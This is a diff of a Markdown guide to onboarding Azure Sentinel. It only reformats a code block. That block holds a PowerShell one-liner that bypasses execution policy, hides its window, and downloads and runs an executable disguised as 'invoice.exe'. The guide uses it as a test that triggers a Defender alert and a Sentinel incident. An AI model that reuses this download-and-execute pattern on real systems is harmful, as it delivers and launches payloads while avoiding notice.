@@ -80,9 +80,9 @@ To on-board Azure Sentinel, you first need to enable Azure Sentinel, and then co
 
 2. Open CMD as non-Admin, and execute the below Commandline.
 
-       ```
-       powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'
-       ```
+```
+powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'
+```
 This should take couple of minutes to report to Defender and then eventually being captured by Azure Sentinel. In sometime you should be able to see a new Incident getting created for the above malicious command execution.
 
 ![ws name.](media/sentinel12.png)
